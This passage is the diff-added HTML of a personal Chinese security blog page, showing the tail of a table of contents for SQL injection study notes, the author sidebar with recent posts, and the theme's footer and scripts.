href="#%E9%80%9A%E8%BF%87%E8%AF%A6%E7%BB%86%E7%9A%84-SQL-%E9%94%99%E8%AF%AF%E6%B6%88%E6%81%AF%E6%8F%90%E5%8F%96%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE"><span class="nav-text">通过详细的 SQL 错误消息提取敏感数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E8%A7%A6%E5%8F%91%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E6%9D%A5%E5%88%A9%E7%94%A8%E7%9B%B2-SQL-%E6%B3%A8%E5%85%A5"><span class="nav-text">通过触发时间延迟来利用盲 SQL 注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E5%B8%A6%E5%A4%96-OAST-%E6%8A%80%E6%9C%AF%E5%88%A9%E7%94%A8%E7%9B%B2-SQL-%E6%B3%A8%E5%85%A5"><span class="nav-text">使用带外 (OAST) 技术利用盲 SQL 注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2sql%E6%B3%A8%E5%85%A5"><span class="nav-text">如何防止sql注入</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
+  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">59</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/guayu-kakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayu-kakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/21833.html" title="posts&#x2F;21833.html">SQL漏洞学习笔记</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/23894.html" title="posts&#x2F;23894.html">HMV-SuidyRevenge</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/40609.html" title="posts&#x2F;40609.html">CSRF漏洞学习笔记</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/26924.html" title="posts&#x2F;26924.html">HMV-Forbidden</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/37808.html" title="posts&#x2F;37808.html">SSRF漏洞学习笔记</a>
+        </li>
+    </ul>
+  </div>
+      </div>
+
+      
+      
+        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
+          <div class="links-of-blogroll-title">
+            <i class="fa fa-history fa-" aria-hidden="true"></i>
+            
+          </div>
+          <ul class="links-of-blogroll-list">
+            
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+          </ul>
+        </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
